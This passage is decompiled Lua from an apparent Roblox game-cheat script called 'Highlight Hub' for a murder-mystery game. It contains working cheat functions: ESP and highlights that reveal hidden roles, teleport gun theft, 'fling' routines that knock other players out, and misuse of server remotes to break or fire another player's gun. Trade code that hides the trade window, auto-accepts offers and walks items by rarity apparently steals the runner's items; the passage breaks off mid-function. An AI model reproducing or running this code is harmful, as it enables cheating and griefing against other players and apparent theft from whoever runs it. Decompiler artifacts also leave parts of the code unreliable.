        repeat
          r32_0.CFrame = CFrame.new(r40_0.GunDrop.Position + Vector3.new(0, -6, 0))
          firetouchinterest(r32_0, r40_0.GunDrop, 1)
          firetouchinterest(r32_0, r40_0.GunDrop, 0)
          task.wait()
        until not r40_0.Map:FindFirstChild("GunDrop")
        task.wait(0.05)
        r32_0.CFrame = CFrame.new(r0_181)
        r31_0:ChangeState(1)
        r40_0.GunDrop = nil
        if r42_0.RoundInformationDesc then
          r42_0.RoundInformationDesc:SetContent(" Murderer: " .. tostring(r40_0.Gameplay.Murderer) .. "\n Murderer Perk: " .. tostring(r40_0.MurdererPerk) .. "\n Sheriff: " .. tostring(r40_0.Gameplay.Sheriff) .. "\n Is Gun Dropped: No")
        end
      end
    end)
  end
  function StealGun()
    -- line: [0, 0] id: 82
    if IsAlive() and tostring(r40_0.Gameplay.Murderer) ~= r29_0.Name and tostring(r40_0.Gameplay.Sheriff) ~= r29_0.Name then
      if r40_0.Gameplay.Sheriff then
        SprayPlayer(tostring(r40_0.Gameplay.Sheriff), "Reset")
        repeat
          task.wait()
        until r9_0:FindFirstChild("Normal"):FindFirstChild("GunDrop")
        GrabGun()
      elseif r9_0:FindFirstChild("Normal"):FindFirstChild("GunDrop") then
        GrabGun()
      end
    end
  end
  function BreakGun(r0_9)
    -- line: [0, 0] id: 9
    task.spawn(function()
      -- line: [0, 0] id: 10
      local r0_10, r1_10 = pcall(function()
        -- line: [0, 0] id: 11
        if r40_0.Gameplay.Sheriff and tostring(r40_0.Gameplay.Sheriff) ~= r29_0.Name then
          local r0_11 = r14_0[tostring(r40_0.Gameplay.Sheriff)]
          (r0_11.Backpack:FindFirstChild("Gun") or r0_11.Character:FindFirstChild("Gun")).KnifeServer.ShootGun:InvokeServer(1, game, "AH2")
        end
      end)
      if r0_9 then
        if not r0_10 and r1_10:find("attempt to perform arithmetic") then
          r0_0:Notify({
            Title = "Highlight Hub",
            Content = "Successfully broke the gun.",
            Duration = 5,
          })
          return 
        end
        if not r0_10 then
          warn("Break gun diff error: " .. r1_10)
        end
        r0_0:Notify({
          Title = "�� Error",
          Content = "Failed to break the gun.",
          Duration = 5,
        })
      end
    end)
  end
  function ForceShoot(r0_152)
    -- line: [0, 0] id: 152
    pcall(function()
      -- line: [0, 0] id: 153
      if r40_0.Gameplay.Sheriff and tostring(r40_0.Gameplay.Sheriff) ~= r29_0.Name then
        local r0_153 = r14_0[tostring(r40_0.Gameplay.Sheriff)]
        local r1_153 = r0_153 and (r0_153.Backpack:FindFirstChild("Gun") or r0_153.Character:FindFirstChild("Gun"))
        if r1_153 then
          r1_153.KnifeServer.ShootGun:InvokeServer(1, r0_152, "AH2")
        end
      end
    end)
  end
  function ShootGun(r0_159)
    -- line: [0, 0] id: 159
    task.spawn(function()
      -- line: [0, 0] id: 160
      r30_0.Gun.KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(1, r0_159, "AH2")
    end)
  end
  function ShootMurderer()
    -- line: [0, 0] id: 20
    if r40_0.Gameplay.Sheriff then
      local r0_20 = r30_0:FindFirstChild("Gun")
      if not r0_20 then
        EquipTool("Gun")
        r0_20 = r30_0:FindFirstChild("Gun")
      end
      if r0_20 then
        local r1_20 = r32_0.Position
        r32_0.CFrame = CFrame.new(r14_0[tostring(r40_0.Gameplay.Murderer)].Character.HumanoidRootPart.Position) * CFrame.new(0, 0, 5)
        task.wait(0.2)
        ShootGun(r14_0[tostring(r40_0.Gameplay.Murderer)].Character.HumanoidRootPart.Position)
        task.wait(0.3)
        r32_0.CFrame = CFrame.new(r1_20)
      end
    end
  end
  r52_0 = false
  function GetPlayer(r0_175)
    -- line: [0, 0] id: 175
    r0_175 = r0_175:lower()
    if r0_175 == "all" or r0_175 == "others" then
      r52_0 = true
      return 
    end
    if r0_175 == "random" then
      local r1_175 = r14_0:GetPlayers()
      if table.find(r1_175, r29_0) then
        table.remove(r1_175, table.find(r1_175, r29_0))
      end
      return r1_175[math.random(#r1_175)]
    end
    if r0_175 ~= "random" and r0_175 ~= "all" and r0_175 ~= "others" then
      local r1_175 = next
      local r2_175, r3_175 = r14_0:GetPlayers()
      for r4_175, r5_175 in r1_175, r2_175, r3_175 do
        if r5_175 ~= r29_0 then
          if r5_175.Name:lower():match("^" .. r0_175) then
            return r5_175
          end
          if r5_175.DisplayName:lower():match("^" .. r0_175) then
            return r5_175
          end
        end
      end
    else
      return 
    end
  end
  function Fling(r0_106)
    -- line: [0, 0] id: 106
    pcall(function()
      -- line: [0, 0] id: 107
      local r0_107 = r0_106.Character
      local r1_107 = nil
      local r2_107 = nil
      local r3_107 = nil
      local r4_107 = nil
      local r5_107 = nil
      if r0_107:FindFirstChildOfClass("Humanoid") then
        r1_107 = r0_107:FindFirstChildOfClass("Humanoid")
      end
      if r1_107 and r1_107.RootPart then
        r2_107 = r1_107.RootPart
      end
      if r0_107:FindFirstChild("Head") then
        r3_107 = r0_107.Head
      end
      if r0_107:FindFirstChildOfClass("Accessory") then
        r4_107 = r0_107:FindFirstChildOfClass("Accessory")
      end
      if Accessoy and r4_107:FindFirstChild("Handle") then
        r5_107 = r4_107.Handle
      end
      if r30_0 and r31_0 and r32_0 then
        if r32_0.Velocity.Magnitude < 50 then
          getgenv().OldPos = r32_0.CFrame
        end
        if r1_107 and r1_107.Sit and not r52_0 then
          return 
        end
        if r3_107 then
          r9_0.CurrentCamera.CameraSubject = r3_107
        elseif not r3_107 and r5_107 then
          r9_0.CurrentCamera.CameraSubject = r5_107
        elseif r1_107 and r2_107 then
          r9_0.CurrentCamera.CameraSubject = r1_107
        end
        if not r0_107:FindFirstChildWhichIsA("BasePart") then
          return 
        end
        function FPos(r0_108, r1_108, r2_108)
          -- line: [0, 0] id: 108
          r32_0.CFrame = CFrame.new(r0_108.Position) * r1_108 * r2_108
          r30_0:SetPrimaryPartCFrame(CFrame.new(r0_108.Position) * r1_108 * r2_108)
          r32_0.Velocity = Vector3.new(90000000, 900000000, 90000000)
          r32_0.RotVelocity = Vector3.new(900000000, 900000000, 900000000)
        end
        function SFBasePart(r0_109)
          -- line: [0, 0] id: 109
          local r1_109 = 2
          local r2_109 = tick()
          local r3_109 = 0
          while r32_0 do
            local r4_109 = r1_107
            if r4_109 then
              r4_109 = r0_109.Velocity.Magnitude
              if r4_109 < 50 then
                r3_109 = r3_109 + 100
                FPos(r0_109, CFrame.new(0, 1.5, 0) + r1_107.MoveDirection * r0_109.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(r3_109), 0, 0))
                task.wait()
                FPos(r0_109, CFrame.new(0, -1.5, 0) + r1_107.MoveDirection * r0_109.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(r3_109), 0, 0))
                task.wait()
                FPos(r0_109, CFrame.new(2.25, 1.5, -2.25) + r1_107.MoveDirection * r0_109.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(r3_109), 0, 0))
                task.wait()
                FPos(r0_109, CFrame.new(-2.25, -1.5, 2.25) + r1_107.MoveDirection * r0_109.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(r3_109), 0, 0))
                task.wait()
                FPos(r0_109, CFrame.new(0, 1.5, 0) + r1_107.MoveDirection, CFrame.Angles(math.rad(r3_109), 0, 0))
                task.wait()
                FPos(r0_109, CFrame.new(0, -1.5, 0) + r1_107.MoveDirection, CFrame.Angles(math.rad(r3_109), 0, 0))
                task.wait()
              else
                FPos(r0_109, CFrame.new(0, 1.5, r1_107.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                task.wait()
                FPos(r0_109, CFrame.new(0, -1.5, -r1_107.WalkSpeed), CFrame.Angles(0, 0, 0))
                task.wait()
                FPos(r0_109, CFrame.new(0, 1.5, r1_107.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                task.wait()
                FPos(r0_109, CFrame.new(0, 1.5, r2_107.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                task.wait()
                FPos(r0_109, CFrame.new(0, -1.5, -r2_107.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
                task.wait()
                FPos(r0_109, CFrame.new(0, 1.5, r2_107.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                task.wait()
                FPos(r0_109, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                task.wait()
                FPos(r0_109, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                task.wait()
                FPos(r0_109, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(-90), 0, 0))
                task.wait()
                FPos(r0_109, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                task.wait()
              end
              r4_109 = r0_109.Velocity.Magnitude
              if r4_109 <= 500 then
                r4_109 = r0_109.Parent
                if r4_109 == r0_106.Character then
                  r4_109 = r0_106.Parent
                  if r4_109 == r14_0 then
                    r4_109 = not r0_106.Character
                    if r4_109 ~= r0_107 then
                      r4_109 = r1_107.Sit
                      if not r4_109 then
                        r4_109 = r31_0.Health
                        if r4_109 > 0 then
                          r4_109 = tick()
                          if r2_109 + r1_109 < r4_109 then
                            break
                          end
                        else
                          break
                        end
                      else
                        break
                      end
                    else
                      break
                    end
                  else
                    break
                  end
                else
                  break
                end
              else
                break
              end
            else
              break
            end
          end
        end
        r9_0.FallenPartsDestroyHeight = 0 / 0
        local r6_107 = Instance.new("BodyVelocity")
        r6_107.Name = "EpixVel"
        r6_107.Parent = r32_0
        r6_107.Velocity = Vector3.new(900000000, 900000000, 900000000)
        r6_107.MaxForce = Vector3.new(1 / 0, 1 / 0, 1 / 0)
        r31_0:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
        if r2_107 and r3_107 then
          if (r2_107.CFrame.p - r3_107.CFrame.p).Magnitude > 5 then
            SFBasePart(r3_107)
          else
            SFBasePart(r2_107)
          end
        elseif r2_107 and not r3_107 then
          SFBasePart(r2_107)
        elseif not r2_107 and r3_107 then
          SFBasePart(r3_107)
        elseif not r2_107 and not r3_107 and r4_107 and r5_107 then
          SFBasePart(r5_107)
        else
          return 
        end
        r6_107:Destroy()
        r31_0:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        r9_0.CurrentCamera.CameraSubject = r31_0
        repeat
          r32_0.CFrame = getgenv().OldPos * CFrame.new(0, 0.5, 0)
          r30_0:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, 0.5, 0))
          r31_0:ChangeState("GettingUp")
          table.foreach(r30_0:GetChildren(), function(r0_110, r1_110)
            -- line: [0, 0] id: 110
            if r1_110:IsA("BasePart") then
              local r2_110 = Vector3.new()
              r1_110.RotVelocity = Vector3.new()
              r1_110.Velocity = r2_110
            end
          end)
          task.wait()
        until (r32_0.Position - getgenv().OldPos.p).Magnitude < 25
        r9_0.FallenPartsDestroyHeight = getgenv().FPDH
      else
        return 
      end
    end)
  end
  function FlingKill(r0_168)
    -- line: [0, 0] id: 168
    pcall(function()
      -- line: [0, 0] id: 169
      if r0_168 == "All" then
        r52_0 = true
        for r3_169, r4_169 in ipairs(r14_0:GetPlayers()) do
          if r4_169 ~= r29_0 and not IsPlayerWhitelisted(r4_169.Name) then
            Fling(r4_169)
          end
        end
        r52_0 = false
      else
        local r0_169 = GetPlayer(r0_168)
        if r0_169 and r0_169 ~= r29_0 then
          Fling(r0_169)
        end
      end
    end)
  end
  function CreateHighlight(r0_59, r1_59)
    -- line: [0, 0] id: 59
    local r2_59, r3_59 = pcall(function()
      -- line: [0, 0] id: 60
      if not r40_0.IsRoundStarting and not r40_0.IsRoundStarted and r0_59 ~= "Dead" then
        return 
      end
      local r0_60 = r40_0.Gameplay.Murderer and r14_0[tostring(r40_0.Gameplay.Murderer)]
      local r1_60 = r40_0.Gameplay.Sheriff and r14_0[tostring(r40_0.Gameplay.Sheriff)]
      local r2_60 = nil
      if r0_59 == "Murderer" then
        local r3_60 = r0_60 and r0_60.Character
        r2_60 = r3_60 and r3_60:FindFirstChild("Highlight")
        if not r39_0.ShowMurderer and r0_60 and r2_60 then
          r2_60:Destroy()
        elseif r0_60 ~= r29_0 then
          if not r2_60 then
            r2_60 = Instance.new("Highlight", r3_60)
            r2_60.FillTransparency = 0.5
            r2_60.FillColor = Color3.fromRGB(200, 0, 0)
            r2_60.OutlineColor = Color3.fromRGB(200, 0, 0)
          elseif r2_60.OutlineColor ~= Color3.fromRGB(200, 0, 0) then
            r2_60.FillTransparency = 0.5
            r2_60.FillColor = Color3.fromRGB(200, 0, 0)
            r2_60.OutlineColor = Color3.fromRGB(200, 0, 0)
          end
        end
      elseif r0_59 == "Sheriff" then
        local r3_60 = r1_60 and r1_60.Character
        r2_60 = r3_60 and r3_60:FindFirstChild("Highlight")
        if not r39_0.ShowSheriff and r1_60 and r2_60 then
          r2_60:Destroy()
        elseif r1_60 ~= r29_0 then
          if not r2_60 then
            r2_60 = Instance.new("Highlight", r3_60)
            r2_60.FillTransparency = 0.5
            r2_60.FillColor = Color3.fromRGB(0, 0, 200)
            r2_60.OutlineColor = Color3.fromRGB(0, 0, 200)
          elseif r2_60.OutlineColor ~= Color3.fromRGB(0, 0, 200) then
            r2_60.FillTransparency = 0.5
            r2_60.FillColor = Color3.fromRGB(0, 0, 200)
            r2_60.OutlineColor = Color3.fromRGB(0, 0, 200)
          end
        end
      elseif r0_59 == "Innocent" then
        for r6_60, r7_60 in pairs(r14_0:GetPlayers()) do
          if r7_60 ~= r29_0 and r7_60 ~= r0_60 and r7_60 ~= r1_60 and IsAlive(r7_60.Name) then
            local r8_60 = r7_60 and r7_60.Character
            r2_60 = r8_60 and r8_60:FindFirstChild("Highlight")
            if not r39_0.ShowInnocent and r2_60 then
              r2_60:Destroy()
            elseif not r2_60 then
              r2_60 = Instance.new("Highlight", r8_60)
              r2_60.FillTransparency = 0.5
              r2_60.FillColor = Color3.fromRGB(0, 200, 0)
              r2_60.OutlineColor = Color3.fromRGB(0, 200, 0)
            elseif r2_60.OutlineColor ~= Color3.fromRGB(0, 200, 0) then
              r2_60.FillTransparency = 0.5
              r2_60.FillColor = Color3.fromRGB(0, 200, 0)
              r2_60.OutlineColor = Color3.fromRGB(0, 200, 0)
            end
          end
        end
      elseif r0_59 == "Dead" then
        for r6_60, r7_60 in pairs(r14_0:GetPlayers()) do
          if r7_60 ~= r29_0 and not IsAlive(r7_60.Name) then
            local r8_60 = r7_60 and r7_60.Character
            r2_60 = r8_60 and r8_60:FindFirstChild("Highlight")
            if not r39_0.ShowDead and r2_60 then
              r2_60:Destroy()
            elseif not r2_60 then
              r2_60 = Instance.new("Highlight", r8_60)
              r2_60.FillTransparency = 0.5
              r2_60.FillColor = Color3.fromRGB(128, 128, 128)
              r2_60.OutlineColor = Color3.fromRGB(128, 128, 128)
            elseif r2_60.OutlineColor ~= Color3.fromRGB(128, 128, 128) then
              r2_60.FillTransparency = 0.5
              r2_60.FillColor = Color3.fromRGB(128, 128, 128)
              r2_60.OutlineColor = Color3.fromRGB(128, 128, 128)
            end
          end
        end
      elseif r0_59 == "Gun" and r1_59 then
        r2_60 = r1_59:FindFirstChild("Highlight")
        if not r39_0.ShowGun and r2_60 then
          r2_60:Destroy()
        elseif not r2_60 then
          Instance.new("Highlight", r1_59).OutlineColor = Color3.fromRGB(0, 150, 0)
        end
      elseif r0_59 == "Trap" and r1_59 then
        return 
      end
    end)
    if not r2_59 then
      warn(r3_59)
    end
  end
  function CreatePlayerESP(r0_78, r1_78, r2_78, r3_78, r4_78)
    -- line: [0, 0] id: 78
    local r5_78 = Drawing.new("Text")
    local r6_78 = nil
    local function r7_78()
      -- line: [0, 0] id: 80
      if r0_78 and r0_78:IsA("Player") then
        local r0_80 = r0_78.Character
        if r0_80 and r0_80:FindFirstChild("HumanoidRootPart") and r0_80:FindFirstChild("Head") then
          local r1_80 = r0_80.HumanoidRootPart
          local r3_80, r4_80 = r35_0:WorldToViewportPoint(r0_80.Head.Position)
          if r3_80 then
            r5_78.Size = r2_78
            r5_78.Center = true
            r5_78.Outline = false
            r5_78.OutlineColor = r1_78
            r5_78.Color = r1_78
            r5_78.Transparency = r3_78
            r5_78.Font = Drawing.Fonts.UI
            if r4_80 then
              r5_78.Position = Vector2.new(r3_80.X, r3_80.Y - 25)
              local r6_80 = r5_78
              local r7_80 = "("
              local r8_80 = tostring(math.floor((r1_80.Position - r32_0.Position).Magnitude))
              local r9_80 = ") "
              local r10_80 = r0_78.Name
              local r11_80 = r4_78
              if r11_80 then
                r11_80 = " [" .. r4_78 .. "]" or ""
              else
                goto label_87	-- block#9 is visited secondly
              end
              r6_80.Text = r7_80 .. r8_80 .. r9_80 .. r10_80 .. r11_80
              r5_78.Visible = true
            else
              r5_78.Visible = false
            end
          else
            r5_78.Visible = false
          end
        else
          r5_78.Visible = false
        end
      else
        r5_78.Visible = false
      end
    end
    local function r8_78()
      -- line: [0, 0] id: 79
      r6_78 = r15_0.RenderStepped:Connect(r7_78)
    end
    local function r9_78()
      -- line: [0, 0] id: 81
      if r6_78 then
        r6_78:Disconnect()
      end
      r5_78.Visible = false
    end
    r8_78()
    return {
      Update = r7_78,
      Enable = r8_78,
      Disable = r9_78,
    }
  end
  r53_0 = nil
  local r54_0 = nil
  local r55_0 = {}
  function CreateESP(r0_146, r1_146, r2_146, r3_146)
    -- line: [0, 0] id: 146
    local r4_146 = r40_0.Gameplay.Murderer and r14_0[tostring(r40_0.Gameplay.Murderer)]
    local r5_146 = r40_0.Gameplay.Sheriff and r14_0[tostring(r40_0.Gameplay.Sheriff)]
    if r1_146 == "Murderer" then
      if r0_146 and r4_146 ~= r29_0 then
        if r53_0 then
          r53_0.Disable()
        end
        r53_0 = CreatePlayerESP(r4_146, Color3.fromRGB(200, 0, 0), r2_146, r3_146, r40_0.MurdererPerk)
      elseif r53_0 then
        r53_0.Disable()
        r53_0 = nil
      end
    elseif r1_146 == "Sheriff" then
      if r0_146 and r5_146 ~= r29_0 then
        if r54_0 then
          r54_0.Disable()
        end
        r54_0 = CreatePlayerESP(r5_146, Color3.fromRGB(0, 0, 200), r2_146, r3_146)
      elseif r54_0 then
        r54_0.Disable()
        r54_0 = nil
      end
    elseif r1_146 == "Innocent" then
      for r9_146, r10_146 in ipairs(r55_0) do
        r10_146.Disable()
      end
      r55_0 = {}
      if r0_146 then
        for r9_146, r10_146 in pairs(r14_0:GetPlayers()) do
          if r10_146 ~= r29_0 and r10_146 ~= r4_146 and r10_146 ~= r5_146 and IsAlive(r10_146.Name) then
            table.insert(r55_0, CreatePlayerESP(r10_146, Color3.fromRGB(0, 200, 0), r2_146, r3_146))
          end
        end
      end
    end
  end
  function TextPart(r0_65, r1_65)
    -- line: [0, 0] id: 65
    local r2_65 = Instance.new("BillboardGui")
    r2_65.Adornee = r0_65
    r2_65.Size = UDim2.new(0, 100, 0, 50)
    r2_65.StudsOffset = Vector3.new(0, 3, 0)
    r2_65.AlwaysOnTop = true
    local r3_65 = Instance.new("TextLabel")
    r3_65.Size = UDim2.new(0.3, 0, 0.3, 0)
    r3_65.BackgroundTransparency = 1
    r3_65.Text = r1_65
    r3_65.TextColor3 = Color3.new(0, 255, 0)
    r3_65.TextScaled = true
    r3_65.Parent = r2_65
    r2_65.Parent = r0_65
  end
  r56_0 = {}
  local r59_0 = "Connect"
  function r59_0()
    -- line: [0, 0] id: 122
    pcall(function()
      -- line: [0, 0] id: 123
      if r39_0.Noclip and r30_0 then
        for r3_123, r4_123 in pairs(r30_0:GetDescendants()) do
          if r4_123:IsA("BasePart") and r4_123.CanCollide then
            r4_123.CanCollide = false
            r56_0[r4_123] = true
          end
        end
      else
        for r3_123, r4_123 in pairs(r56_0) do
          r56_0[r3_123] = nil
          r3_123.CanCollide = true
        end
      end
    end)
  end
  r15_0.Stepped:[r59_0](r59_0)
  r59_0 = "Connect"
  function r59_0(r0_111)
    -- line: [0, 0] id: 111
    r30_0 = r0_111
    r31_0 = r30_0:WaitForChild("Humanoid")
    r32_0 = r30_0:WaitForChild("HumanoidRootPart")
    r40_0.InSprayCooldown = false
    r43_0.Died = r31_0.Died:Connect(function()
      -- line: [0, 0] id: 112
      r43_0.Died:Disconnect()
      if r39_0.Stealth then
        InfiniteGhost(false)
      end
    end)
    if r39_0.Stealth then
      InfiniteGhost(true)
    end
  end
  r29_0.CharacterAdded:[r59_0](r59_0)
  for r60_0, r61_0 in pairs(r14_0:GetPlayers()) do
    FixMemoryLeak(r61_0)
    local r64_0 = "Connect"
    function r64_0()
      -- line: [0, 0] id: 167
      FixMemoryLeak(r61_0)
    end
    r61_0.CharacterAdded:[r64_0](r64_0)
    -- close: r60_0
  end
  r59_0 = "Connect"
  function r59_0(r0_66)
    -- line: [0, 0] id: 66
    print("Role: " .. r0_66)
    for r4_66, r5_66 in pairs(r14_0:GetPlayers()) do
      FixMemoryLeak(r5_66)
    end
    r40_0.IsRoundStarting = true
    r40_0.Gameplay = {}
    r40_0.GameplayMap = {}
    GetRoles()
    r40_0.Map = nil
    FindMap()
    if r39_0.WhitelistMurderer and not table.find(r39_0.WhitelistedPlayers, tostring(r40_0.Gameplay.Murderer)) then
      table.insert(r39_0.WhitelistedPlayers, tostring(r40_0.Gameplay.Murderer))
    end
    r40_0.MurdererPerk = GetMurdererPerk()
    if r39_0.MurdererESP then
      CreateESP(true, "Murderer", r39_0.ESPTextSize, r39_0.ESPTextTransparency)
    end
    if r39_0.SheriffESP then
      CreateESP(true, "Sheriff", r39_0.ESPTextSize, r39_0.ESPTextTransparency)
    end
    if r39_0.InnocentESP then
      CreateESP(true, "Innocent", r39_0.ESPTextSize, r39_0.ESPTextTransparency)
    end
    if r39_0.ShowMurderer then
      CreateHighlight("Murderer")
    end
    if r39_0.ShowSheriff then
      CreateHighlight("Sheriff")
    end
    if r39_0.ShowInnocent then
      CreateHighlight("Innocent")
    end
    if r39_0.AutoBlurtRoles and r40_0.IsRoundStarted then
      SendChatMessage("The murderer is " .. tostring(r40_0.Gameplay.Murderer))
      SendChatMessage("The sheriff is " .. tostring(r40_0.Gameplay.Sheriff))
    end
    if r42_0.RoundInformationDesc then
      r42_0.RoundInformationDesc:SetContent(" Is Round Started: No\n Murderer: " .. tostring(r40_0.Gameplay.Murderer) .. "\n Murderer Perk: " .. tostring(r40_0.MurdererPerk) .. "\n Sheriff: " .. tostring(r40_0.Gameplay.Sheriff) .. "\n Is Gun Dropped: No")
    end
  end
  r12_0.Remotes.Gameplay.RoleSelect.OnClientEvent:[r59_0](r59_0)
  r59_0 = "Connect"
  function r59_0(r0_43)
    -- line: [0, 0] id: 43
    r40_0.IsRoundStarted = true
    r40_0.IsRoundStarting = false
    if r39_0.AutoStealGun then
      StealGun()
    end
    if r39_0.SecondLife then
      r31_0:ChangeState(11)
    end
    if r39_0.SeeDeadChat then
      r12_0.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/join dead", "normalchat")
    end
    if r42_0.RoundInformationDesc then
      r42_0.RoundInformationDesc:SetContent(" Is Round Started: Yes\n Murderer: " .. tostring(r40_0.Gameplay.Murderer) .. "\n Murderer Perk: " .. tostring(r40_0.MurdererPerk) .. "\n Sheriff: " .. tostring(r40_0.Gameplay.Sheriff) .. "\n Is Gun Dropped: No")
    end
    if r39_0.AutoKillEveryone then
      task.wait(1)
      KillAll()
    end
    if r39_0.AutoKillSheriff then
      task.wait(1)
      KillPlayer(tostring(r40_0.Gameplay.Sheriff), true)
    end
  end
  r12_0.Remotes.Gameplay.RoundStart.OnClientEvent:[r59_0](r59_0)
  r59_0 = "Connect"
  function r59_0(r0_49)
    -- line: [0, 0] id: 49
    r40_0.IsRoundStarted = false
    r40_0.Gameplay.Murderer = nil
    r40_0.Gameplay.Sheriff = nil
    r40_0.MurdererPerk = nil
    if r39_0.WhitelistMurderer and table.find(r39_0.WhitelistedPlayers, tostring(r40_0.Gameplay.Murderer)) and not table.find(r39_0.ManualWhitelistedPlayers, tostring(r40_0.Gameplay.Murderer)) then
      r39_0.WhitelistedPlayers[tostring(r40_0.Gameplay.Murderer)] = nil
    end
    if r39_0.SecondLife then
      r31_0:ChangeState(18)
    end
    if r42_0.RoundInformationDesc then
      r42_0.RoundInformationDesc:SetContent(" Is Round Started: No\n Murderer: nil\n Murderer Perk: nil\n Sheriff: nil\n Is Gun Dropped: No")
    end
  end
  r12_0.Remotes.Gameplay.VictoryScreen.OnClientEvent:[r59_0](r59_0)
  r59_0 = "Connect"
  function r59_0()
    -- line: [0, 0] id: 68
    if r39_0.Stealth then
      InfiniteGhost(false)
    end
    if r39_0.MurdererESP then
      CreateESP(false, "Murderer", r39_0.ESPTextSize, r39_0.ESPTextTransparency)
    end
    if r39_0.SheriffESP then
      CreateESP(false, "Sheriff", r39_0.ESPTextSize, r39_0.ESPTextTransparency)
    end
    if r39_0.InnocentESP then
      CreateESP(false, "Innocent", r39_0.ESPTextSize, r39_0.ESPTextTransparency)
    end
  end
  r43_0.RoundEndFade = r12_0.Remotes.Gameplay.RoundEndFade.OnClientEvent:[r59_0](r59_0)
  r59_0 = "Connect"
  function r59_0(r0_138)
    -- line: [0, 0] id: 138
    if r0_138.ClassName == "Tool" and r0_138:IsA("Knife") and not r40_0.Gameplay.Murderer or r0_138.Name == "Gun" and r0_138:WaitForChild("KnifeServer", 3) and not r40_0.Gameplay.Sheriff then
      CheckTool(r0_138)
      if r39_0.ShowSheriff then
        CreateHighlight("Sheriff")
      end
      if r39_0.SheriffESP then
        CreateESP(true, "Sheriff", r39_0.ESPTextSize, r39_0.ESPTextTransparency)
      end
      if r39_0.AutoBreakGun and not IsPlayerWhitelisted(r40_0.Gameplay.Sheriff) then
        BreakGun()
      end
      if r39_0.AutoKillSheriff and r40_0.Gameplay.Sheriff then
        KillPlayer(tostring(r40_0.Gameplay.Sheriff), true)
      end
    end
    if r0_138.Name == "GunDrop" and (r40_0.IsRoundStarted or r40_0.IsRoundStarting) then
      r40_0.GunDrop = r0_138
      r40_0.Gameplay.Sheriff = nil
      if r39_0.ShowGun then
        TextPart(r0_138, "Gun Drop")
      end
      if r39_0.AutoGrabGun then
        GrabGun()
      end
    end
    if r39_0.DestroyDisplay and (r0_138.Parent == "WeaponDisplays" or r0_138.Parent == "PetContainer") then
      task.wait()
      r0_138:Destroy()
    end
    if r39_0.DestroyBarriers and ((r0_138:IsA("Part") or r0_138:IsA("Model")) and r0_138.Name == "GlitchProof" or r0_138.Name == "InvisWalls") then
      task.wait()
      r0_138:Destroy()
    end
    if r40_0.IsRoundStarted and r0_138:IsA("Model") and r39_0.DestroyDeadBody and r0_138.Name == "Raggy" then
      task.wait(0.1)
      r0_138:Destroy()
    end
    if r39_0.AntiTrap and r0_138.Name == "Trap" and r0_138.Parent ~= r30_0 then
      r0_138:Destroy()
    end
    -- warn: not visited block [37]
    -- block#37:
    -- task.wait()
    -- r0_138:Destroy()
    -- goto label_189
  end
  r9_0.DescendantAdded:[r59_0](r59_0)
  r59_0 = "Connect"
  function r59_0(r0_14)
    -- line: [0, 0] id: 14
    if r0_14.Name == "GunDrop" then
      r40_0.GunDrop = nil
      if r42_0.RoundInformationDesc then
        r42_0.RoundInformationDesc:SetContent(" Is Round Started: " .. tostring(r40_0.IsRoundStarted) .. "\n Murderer: " .. tostring(r40_0.Gameplay.Murderer) .. "\n Murderer Perk: " .. tostring(r40_0.MurdererPerk) .. "\n Sheriff: " .. tostring(r40_0.Gameplay.Sheriff) .. "\n Is Gun Dropped: No")
      end
    end
  end
  r9_0.DescendantRemoving:[r59_0](r59_0)
  r59_0 = "Connect"
  function r59_0(r0_31)
    -- line: [0, 0] id: 31
    if r0_31.ClassName == "Tool" and r0_31:IsA("Knife") and not r40_0.Gameplay.Murderer or r0_31.Name == "Gun" and r0_31:WaitForChild("KnifeServer", 3) and not r40_0.Gameplay.Sheriff then
      CheckTool(r0_31)
      if r39_0.ShowSheriff then
        CreateHighlight("Sheriff")
      end
      if r39_0.SheriffESP then
        CreateESP(true, "Sheriff", r39_0.ESPTextSize, r39_0.ESPTextTransparency)
      end
      if r39_0.AutoBreakGun and not IsPlayerWhitelisted(r40_0.Gameplay.Sheriff) then
        BreakGun()
      end
      if r39_0.AutoKillSheriff and r40_0.Gameplay.Sheriff then
        KillPlayer(tostring(r40_0.Gameplay.Sheriff), true)
      end
    end
  end
  r14_0.DescendantAdded:[r59_0](r59_0)
  local r57_0 = false
  local r58_0 = 0
  r59_0 = false
  local r60_0 = false
  local r61_0 = {}
  function AAOF()
    -- line: [0, 0] id: 27
    local r0_27 = game:GetService("ReplicatedStorage").Trade.AcceptTrade
    game:GetService("ReplicatedStorage").Trade.UpdateTrade.OnClientEvent:Connect(function(r0_28)
      -- line: [0, 0] id: 28
      if r0_28.LastOffer then
        while true do
          r0_27:FireServer(game.PlaceId * 3, r0_28.LastOffer)
          task.wait(0.5)
        end
        return 
      else
        goto label_15	-- block#2 is visited secondly
      end
    end)
  end
  local r64_0 = "Connect"
  function r64_0()
    -- line: [0, 0] id: 63
    if r60_0 then
      r29_0.PlayerGui:FindFirstChild("TradeGUI").Enabled = false
      r29_0.PlayerGui:FindFirstChild("TradeGUI_Phone").Enabled = false
    end
    if r59_0 then
      AAOF()
    end
  end
  r15_0.Heartbeat:[r64_0](r64_0)
  function CompatibilityCheck(r0_4, r1_4)
    -- line: [0, 0] id: 4
    r12_0.Trade.CancelRequest:FireServer()
    r12_0.Trade.DeclineRequest:FireServer()
    r12_0.Trade.DeclineTrade:FireServer()
    r58_0 = 0
    r60_0 = true
    r12_0.Trade.SendRequest:InvokeServer(r14_0:WaitForChild(r0_4))
    repeat
      task.wait()
    until r12_0.Trade.GetTradeStatus:InvokeServer() == "StartTrade"
    for r5_4, r6_4 in pairs(r45_0) do
      if not r1_4 then
        if r46_0[r6_4.rarity] then
